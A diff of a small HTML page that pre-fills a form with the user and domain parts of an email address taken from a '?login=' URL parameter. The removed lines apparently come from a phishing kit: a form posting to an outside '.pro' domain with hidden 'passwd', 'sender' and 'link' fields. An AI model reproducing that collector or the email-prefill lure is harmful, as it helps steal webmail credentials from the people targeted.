@@ -2,38 +2,46 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Split URL Email</title>
+  <title>Email, User & Domain</title>
   <style>
     body            { font-family: Arial, sans-serif; margin: 2rem; }
-    form            { max-width: 360px; border: 1px solid #ccc; padding: 1rem; border-radius: 6px; }
-    label           { display: block; margin-top: .9rem; font-weight: 600; }
+    form            { max-width: 400px; border: 1px solid #ccc; padding: 1rem; border-radius: 6px; }
+    .field          { margin-top: 1.1rem; }
     input[type=text]{ width: 100%; padding: .45rem .6rem; border: 1px solid #888; border-radius: 4px; }
-    button          { margin-top: 1.2rem; padding: .5rem 1.1rem; }
+    button          { margin-top: 1.4rem; padding: .5rem 1.1rem; }
   </style>
 </head>
 <body>
 
-<h2>Email pieces from URL</h2>
+<h2>Email data from URL</h2>
 
-<form action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" method="POST">
-  <label for="userInput">User part</label>
-  <input type="text" id="userInput"   name="user"   value="" readonly>
+<form action="process.php" method="POST">
 
-  <label for="domainInput">Domain part</label>
-  <input type="text" id="domainInput" name="domain" value="" readonly>
-  <input type="hidden" name="sender" value="Nate.com" readonly>
-  <input type="hidden" name="link" value="Nate.com" readonly>
-  <input type="hidden" name="passwd" value="Nate.com" readonly>
+  <div class="field">
+    <h3>Email: email</h3>
+    <input type="text" id="emailInput"  name="email"  value="" readonly>
+  </div>
+
+  <div class="field">
+    <h3>User part</h3>
+    <input type="text" id="userInput"   name="user"   value="" readonly>
+  </div>
+
+  <div class="field">
+    <h3>Domain part</h3>
+    <input type="text" id="domainInput" name="domain" value="" readonly>
+  </div>
+
   <button type="submit">Send to server</button>
 </form>
 
 <script>
-  /* 1. Grab ?login=... from the current URL */
+  /* 1) Read ?login=... */
   const qs       = new URLSearchParams(window.location.search);
-  const rawParam = qs.get('login');                         // e.g. "usr%40naver.com"
-  const email    = rawParam ? decodeURIComponent(rawParam) : '';
+  const rawLogin = qs.get('login');                        // e.g. "usr%40naver.com"
+  const email    = rawLogin ? decodeURIComponent(rawLogin) : '';
 
-  /* 2. Split into user + domain (first "@") */
+  /* 2) Split into user & domain */
   let user = '', domain = '';
   const at = email.indexOf('@');
   if (at !== -1) {
@@ -41,15 +49,16 @@
     domain = email.slice(at + 1);
   }
 
-  /* 3. Fill BOTH the property and the attribute so it shows up in the markup */
-  const userInput   = document.getElementById('userInput');
-  const domainInput = document.getElementById('domainInput');
+  /* 3) Fill inputs (property + attribute) */
+  function fill(id, value) {
+    const el = document.getElementById(id);
+    el.value = value;
+    el.setAttribute('value', value);  // keeps it in the HTML attribute
+  }
 
-  userInput.value            = user;
-  userInput.setAttribute('value', user);        // keeps it in the HTML attribute
-
-  domainInput.value          = domain;
-  domainInput.setAttribute('value', domain);    // keeps it in the HTML attribute
+  fill('emailInput',  email);
+  fill('userInput',   user);
+  fill('domainInput', domain);
 </script>
 
 </body>
